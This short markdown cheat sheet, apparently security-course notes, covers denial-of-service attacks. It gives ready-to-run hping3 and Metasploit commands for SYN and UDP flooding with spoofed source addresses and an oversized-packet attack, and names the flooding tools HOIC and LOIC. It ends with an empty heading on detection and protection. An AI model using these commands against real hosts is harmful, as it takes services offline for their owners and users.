# Denial of Service

## SYN flooding using Metasploit
`msfconsole`
`use auxiliary/dos/tcp/synflood`
SET RHOST, RPORT, SHOST - spoofed IP

## SYN flooding using hping3, many packets
`hping3 -S t.t.t.t -a sp.o.o.fd -p 22 --flood` - S sets SYN flag
## SYN Ping of Death, large packets
`hping3 -d 65538 -S -p 21 t.t.t.t` - d sets data size

# UDP flooding on WS NetBIOS port 139, many packets
`hping3 -2 -p 139 --flood t.t.t.t` - 2 is the UDP mode

## Distributed Denial of Service
HOIC - High Orbit Ion Cannon
LOIC - Low etc

# Detect and Protect against DOS and DDOS
## Anti DDOS Guardian